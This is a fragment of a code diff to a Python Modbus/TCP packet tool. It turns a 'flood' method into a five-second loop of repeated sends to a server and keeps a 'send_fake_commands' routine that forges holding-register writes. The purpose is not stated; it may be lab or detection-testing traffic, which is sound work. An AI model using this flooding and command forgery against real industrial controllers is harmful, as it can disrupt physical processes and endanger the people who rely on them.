@@ -82,7 +82,9 @@ class MBPkt():
             s.close()
 
     def flood(self, sock=None):
-        for i in range(4):
+        time_ref = time.time()
+        while (time.time() < time_ref + 5):
+            #let the query run for 5 seconds
             if sock is None:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((SERVER_IP, SERVER_PORT))
@@ -96,6 +98,7 @@ class MBPkt():
             b[7] = self.fn
             b = b + self.data
             i = 0 
+            print("sending query")
             while i < len(b):
                 i += s.send(b[i:])
         
@@ -201,14 +204,6 @@ def send_fake_commands():
         P = MBPkt.WriteHoldingSingle(i, i).send()
         print("Sending Write Multiple Holding Registers...")
         P = MBPkt.WriteHoldingMultiple(i, list(range(i))).send()
-
-for i in range(1, 4):
-    print("Sending Read Coils...")
-    P = MBPkt.ReadCoils(0, 4).send()
-    print("Sending Read Discrete Inputs...")
-    P = MBPkt.ReadDiscreteInputs(0, i).send()
-    print("Sending Read Multiple Holding Registers...")
-    P = MBPkt.ReadHoldingMultiple(8, 4).send()
 
     
     
